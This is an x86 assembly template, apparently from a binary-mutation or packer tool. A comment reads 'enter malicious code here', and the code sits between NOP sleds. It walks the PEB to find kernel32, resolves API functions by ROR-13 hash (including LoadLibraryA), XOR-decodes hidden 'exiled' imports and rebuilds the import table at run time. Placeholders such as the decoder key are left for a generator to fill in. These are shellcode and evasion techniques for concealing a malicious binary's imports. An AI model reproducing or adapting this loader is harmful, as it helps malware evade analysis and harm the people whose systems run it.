global _start
  
section .text

_start:
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    
; -------------------------------------------
; enter malicious code here
; -------------------------------------------

; <OFFSET_TO_ORIGINAL_IMPORTS> - offset from first byte after resolver to first byte of original imports
; <OFFSET_TO_EXILED_IMPORTS>   - offset from first byte after resolver to first byte of exiled imports
; <DECODER_KEY>                - decoder key
; <IMPORTS_SIZE>               - size of imports
; <BASE_ADDRESS>               - base address of mutated module
    
    jmp     store_resolver_end_addr
    
get_resolver_end_addr:
    pop     esi                                 ; esi = address of spared code
    mov     edi, esi                            ; edi = address of spared code
    add     esi, <OFFSET_TO_ORIGINAL_IMPORTS>   ; esi = address of original imports     HACK!!!! bylo sub
    add     edi, <OFFSET_TO_EXILED_IMPORTS>     ; edi = address of exiled imports

    xor     ebx, ebx                            ; clear registers

    mov     bl,  <DECODER_KEY>                  ; decoder key
    mov     ecx, <IMPORTS_SIZE>                 ; encoded imports size

decoder_loop:
    mov     edx, edi                            ; construct encoded byte address
    add     edx, ecx                            ;
    dec     edx                                 ;
    xor     byte [edx], bl                      ; decode
    loop    decoder_loop                        ; loop back
    xor     eax, eax                            ; eax = 0
    mov     ecx, <IMPORTS_SIZE>                 ; encoded imports size

copy_exiled_imports_loop:
    mov     al, [edi]                           ; memory-memory copy, phase 1
    mov     [esi], al                           ; memory-memory copy, phase 2
    inc     edi                                 ; increment addresses
    inc     esi                                 ;
    loop    copy_exiled_imports_loop            ; loop back
    sub     esi, <IMPORTS_SIZE>                 ; esi = address of original imports
    
resolve_imports:
    call    get_kernel32_dll_base               ; eax = kernel32.dll base address
    
import_descriptors_loop:
    mov     edi, [esi]                          ; edi = value of OriginalFirstThunk
    test    edi, edi                            ; check if zero
    jz      next_engine
    add     esi, 0xC                            ; esi = address of DLL name
    call    call_LoadLibraryA                   ; eax = base address of current DLL
    push    eax                                 ; push base address of current DLL
    mov     eax, ebx                            ; eax = address of kernel32.dll
    mov     ecx, edi                            ; ecx = RVA of INT (Import Name Table)
    add     ecx, <BASE_ADDRESS>                 ; ecx = address of INT (Import Name Table)
    push    esi                                 ; save esi
    xor     edi, edi                            ; edi = 0
    
image_thunk_data_loop:
    mov     edx, [ecx]                          ; edx = RVA of IMAGE_IMPORT_BY_NAME (AddressOfData)
    test    edx, edx                            ; AddressOfData == 0?
    jz      next_import_descriptor
    add     edx, <BASE_ADDRESS>                 ; edx = address of IMAGE_IMPORT_BY_NAME
    add     edx, 0x2                            ; edx = imported function name
    mov     esi, edx                            ; esi = imported function name
    
compute_imported_function_hash:
    xor     eax, eax                            ; eax = 0
    lodsb                                       ; load the byte pointed by esi (the current symbol name character) into al, ++esi
    cmp     al, ah                              ; al == 0
    jz      find_imported_function_address      ; if ZF is set, then end of the string has been reached -> jump hash checking
    ror     edi, 0xd                            ; hash >>= 13
    add     edi, eax                            ; hash += current name character
    jmp     compute_imported_function_hash
    
find_imported_function_address:
    mov     eax, edi                            ; eax = function hash
    pop     esi                                 ; restore esi
    push    eax                                 ; push function hash
    call    find_function                       ; eax = address of imported function
    
nexy_image_thunk_data:
    add     ecx, 0x4                            ; move to another IMAGE_THUNK_DATA
    jmp     image_thunk_data_loop

next_import_descriptor:
    add     esi, 0x8                            ; esi = next IMAGE_IMPORT_DESCRIPTOR
    jmp     import_descriptors_loop

call_LoadLibraryA:
;   HMODULE WINAPI LoadLibrary(
;       _In_  LPCTSTR lpFileName
;   );

    mov     ebx, eax                            ; ebx = kernel32.dll base address
    push    eax                                 ; push kernel32.dll base address
    push    dword 0xec0e4e8e                    ; push LoadLibraryA name hash
    call    find_function
    mov     ecx, [esi]                          ; ecx = RVA of current DLL name
    add     ecx, <BASE_ADDRESS>                 ; ecx = address of current DLL name
    push    ecx                                 ; lpFileName = current DLL name
    call    eax                                 ; call LoadLibraryA -> eax = current DLL base address
    add     esp, 0x8                            ; delete all variables from stack
    ret

get_kernel32_dll_base:
    push    ebp                                 ; save ebp
    push    esi                                 ; save esi
    mov     eax, [fs:0x30]                      ; eax = PEB
    mov     eax, [eax + 0xc]                    ; eax = Ldr
    mov     esi, [eax + 0x1c]                   ; esi = first entry in the initialization order module list
    lodsd                                       ; eax = second entry, which is kernel32.dll
    mov     ebp, [eax + 0x8]                    ; ebp = base address of kernel32.dll
    mov     eax, ebp                            ; eax = base address of kernel32.dll
    pop     esi                                 ; restore esi
    pop     ebp                                 ; restore ebp
    ret                                         ; jmp payload_body

find_function:
    push    ebx                                 ; save ebx
    push    ebp                                 ; save ebp
    push    esi                                 ; save esi
    push    edi                                 ; save edi
    push    ecx                                 ; save ecx
    mov     ebp, [esp + 0x1c]                   ; ebp = base address of DLL (module) to be loaded
    mov     eax, [ebp + 0x3c]                   ; eax = address of DLL's PE header (0x3c = offset to e_lfanew within DOS header)
    mov     edx, [ebp + eax + 0x78]             ; edx = RVA of Export Directory (ebp + eax + 0x79 = first entry in Data Directory)
    add     edx, ebp                            ; edx = address of Export Directory
    mov     ecx, [edx + 0x18]                   ; ecx = number of exported functions (IMAGE_EXPORT_DIRECTORY::NumberOfNames)
    mov     ebx, [edx + 0x20]                   ; ebx = RVA of ENT (Export Name Table)
    add     ebx, ebp                            ; ebx = address of ENT

find_function_loop:
    jecxz   resolve_error                       ; if(ecx == 0) then last symbol was checked, nothing matches -> error
    dec     ecx                                 ; --ecx
    mov     esi, [ebx + ecx * 4]                ; esi = RVA of next exported symbol name
    add     esi, ebp                            ; esi = address of next exported symbol name
    xor     edi, edi                            ; edi = 0 (it will hold exported symbol name hash)
    cld                                         ; clear the direction flag to ensure that it increments instead of decrements when using the lods* instructions

compute_hash:
    xor     eax, eax                            ; eax = 0
    lodsb                                       ; load the byte pointed by esi (the current symbol name character) into al, ++esi
    cmp     al, ah                              ; al == 0
    jz      check_hash                          ; if ZF is set, then end of the string has been reached -> jump hash checking
    ror     edi, 0xd                            ; hash >>= 13
    add     edi, eax                            ; hash += current name character
    jmp     compute_hash

check_hash:
    cmp     edi, [esp + 0x18]                   ; hash == desired function hash
    jnz     find_function_loop                  ; hash doesn't match, check next symbol
    mov     ebx, [edx + 0x24]                   ; ebx = RVA of exported functions ordinals (IMAGE_EXPORT_DIRECTORY::AddressOfNameOrdinals)
    add     ebx, ebp                            ; ebx = address of exported functions ordinals
    mov     cx, [ebx + ecx * 2]                 ; cx = ordinal of function to be resolved (ecx = function index, 2 = sizeof(ordinal))
    mov     ebx, [edx + 0x1c]                   ; ebx = RVA of EAT (Export Address Table)
    add     ebx, ebp                            ; ebx = address of EAT
    mov     eax, [ebx + ecx * 4]                ; eax = RVA of desired function
    add     eax, ebp                            ; eax = address of desired function
    mov     edx, ebp                            ; edx = base address of DLL to be loaded
    pop     ecx                                 ; restore ecx
    pop     edi                                 ; restore edi
    pop     esi                                 ; restore esi
    pop     ebp                                 ; restore ebp
    pop     ebx                                 ; restore ebx
    ret     

resolve_error:
    jmp resolve_error
    
store_resolver_end_addr:
    call    get_resolver_end_addr
    
next_engine:
    
; -------------------------------------------
    
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop